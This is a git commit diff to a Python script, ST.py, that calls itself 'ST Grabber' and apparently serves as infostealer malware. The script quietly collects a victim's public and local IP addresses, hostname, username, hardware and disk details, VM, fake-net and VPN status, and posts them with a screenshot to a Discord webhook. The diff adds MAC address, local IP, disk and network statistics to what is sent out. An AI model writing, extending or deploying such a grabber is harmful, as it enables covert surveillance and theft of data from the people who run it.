cdbb749966e56e782fd85d5f896ae321472c6c2d
human intellectual structure <91017265+suegdu@users.noreply.github.com>
2022-04-19 16:13:12 +0300

    Update ST.py

--- ST.py
+++ ST.py
@@ -14,10 +14,12 @@ import subprocess
 import pyautogui
 import secrets
 from pathlib import Path
-
-
+from uuid import getnode as get_mac
+import socket
 
 DISCORD_WEBHOOK = "YOUR WEBHOOK LINK"
+
+
 
 
 
@@ -37,18 +39,27 @@ c = wmi.WMI()
 my_system = c.Win32_ComputerSystem()[0]
 time2 = time.time()
 sr = uname()
+
+mac = get_mac()
 now = datetime.datetime.now()
 local_now = now.astimezone()
 local_tz = local_now.tzinfo
 local_tzname = local_tz.tzname(local_now)
 vpn = get('http://ip-api.com/json?fields=proxy')
 proxy = vpn.json()['proxy']
-
+cpuis = psutil.cpu_percent()
+host3 = socket.gethostname()
+localip = socket.gethostbyname(host3)
 if hasattr(sys, 'real_prefix'):
     st = True
 else:
      st = False
-
+def scale(bytes, suffix="B"):
+    defined = 1024
+    for unit in ["", "K", "M", "G", "T", "P"]:
+        if bytes < defined:
+            return f"{bytes:.2f}{unit}{suffix}"
+        bytes /= defined
 proc = platform.processor() 
 
 fknet = False
@@ -58,18 +69,28 @@ except:
     fknet = True
 else:
     fknet = "Unknown"
+partitions = psutil.disk_partitions()
+disk_io = psutil.disk_io_counters()
+net_io = psutil.net_io_counters()
 
+partitions = psutil.disk_partitions()
+for partition in partitions:
+    try:
+        partition_usage = psutil.disk_usage(partition.mountpoint)
+    except PermissionError:
+        continue
 
 def sg():
 
  ip = get('https://api.ipify.org').text 
  webhook = DiscordWebhook(url=DISCORD_WEBHOOK,username="ST Grabber",content="Screenshot :")
- embed = DiscordEmbed(title="PT-H14", description="**User (Device)**", color=0xfff700) 
+ embed = DiscordEmbed(title="PT-H14", description="**User (Device)**", color=0x0c0057) 
  embed.set_author(name="ST", icon_url="https://www.shareicon.net/data/512x512/2015/09/28/647652_watch_512x512.png") 
  embed.set_thumbnail(url="https://www.blackhatwisdom.com/wp-content/uploads/2016/10/black-hat-wisdom-logo-2.png") 
  embed.add_embed_field(name="Public IP :", value=ip, inline=True) 
+ embed.add_embed_field(name="Local IP :",value=localip)
  embed.add_embed_field(name="Hostname, Device :", value=f"{platform.node()}", inline=True)
- embed.add_embed_field(name="ETC :", value=f"{uname()}".replace("uname_result","").replace(")","").replace("(",""), inline=True) 
+ embed.add_embed_field(name="ETC :", value=f"{uname()}".replace("uname_result","").replace(")","").replace("(","").replace("'",""), inline=True) 
  embed.add_embed_field(name="User :",value=f" {os.getlogin()} ")
  embed.add_embed_field(name="Operating system :",value=f" {platform.system()}")
  embed.add_embed_field(name="Virtual Machine :",value=f" {st}")
@@ -77,11 +98,15 @@ def sg():
  embed.add_embed_field(name="Model :",value=f" {my_system. Model}")
  embed.add_embed_field(name="NumberOfProcessors :",value=f" {my_system.NumberOfProcessors}")
  embed.add_embed_field(name="SystemType :",value=f" {my_system.SystemType}")
+ embed.add_embed_field(name="Disk Informations :",value=f"Total Size: {scale(partition_usage.total)}\nUsed: {scale(partition_usage.used)}\nFree: {scale(partition_usage.free)}\nPercentage: {partition_usage.percent}%\n\nTotal read: {scale(disk_io.read_bytes)}\nTotal write: {scale(disk_io.write_bytes)}")
  embed.add_embed_field(name="SystemFamily :",value=f" {my_system.SystemFamily}")
  embed.add_embed_field(name="Memory :",value=f" {psutil.virtual_memory()}")
  embed.add_embed_field(name="Path :", value=f"**{sys.argv[0]}**", inline=True)
+ embed.add_embed_field(name="MAC Address :",value=mac)
  embed.add_embed_field(name="Local Timezone :", value=f"**{local_tzname}**", inline=True)
  embed.add_embed_field(name="Processor :", value=f"**{proc}**", inline=True)
+ embed.add_embed_field(name="Network Informations :",value=f"Total Sent: {scale(net_io.bytes_sent)}\nTotal Received: {scale(net_io.bytes_recv)}")
+ #embed.add_embed_field(name="CPU Usage :",value=cpuis)
  embed.add_embed_field(name="Fake Net :", value=f"**{fknet}**", inline=True)
  embed.add_embed_field(name="VPN :",value=proxy)
  embed.set_footer(text=f"{time2}", icon_url="https://static.thenounproject.com/png/2256517-200.png")
@@ -97,6 +122,7 @@ def sg():
 
 if __name__ == "__main__":
  sg()
+
 
 
 
